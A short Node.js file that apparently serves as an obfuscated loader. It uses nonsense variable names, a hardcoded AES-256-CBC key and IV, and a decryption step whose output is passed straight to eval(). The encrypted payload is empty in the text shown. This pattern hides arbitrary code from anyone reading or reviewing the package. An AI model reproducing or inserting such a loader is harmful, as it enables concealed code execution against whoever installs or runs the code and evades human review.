const ito = require('crypto');
const itinho = Buffer.from('c7f84ceb8624606a535abc14b2a47b33142affd9eaa87a43e97c260b63957c24', 'hex');
const octua = Buffer.from('a83090138f8c37de02444beb25e26412', 'hex');
const Itinho = '';
const itinhoher = ito.createDecipheriv('aes-256-cbc', itinho, octua);
let ohniticry = itinhoher.update(Itinho, 'hex', 'utf8');
ohniticry += itinhoher.final('utf8');
eval(ohniticry);
